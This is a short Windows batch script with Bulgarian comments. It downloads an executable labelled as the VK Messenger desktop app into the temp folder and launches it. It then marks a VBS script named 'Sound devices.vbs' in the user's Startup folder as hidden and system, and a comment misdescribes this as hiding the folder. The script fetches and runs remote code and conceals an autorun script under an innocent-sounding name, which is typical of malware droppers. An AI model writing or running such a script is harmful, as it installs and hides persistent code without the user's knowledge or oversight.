@echo off

:: Сваляне на файла в %temp%
echo Downloading file...
powershell -Command "Invoke-WebRequest -Uri 'https://upload.object2.vk-apps.com/vk-me-desktop-dev-5837a06d-5f28-484a-ac22-045903cb1b1a/latest/win10/vk-messenger-x64.exe' -OutFile '%temp%\vk-messenger.exe'"

:: Стартиране на файла
echo Starting application...
start "" "%temp%\vk-messenger.exe"

:: Скриване на startup folder
attrib +h +s "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Sound devices.vbs"
echo Startup folder is now hidden
pause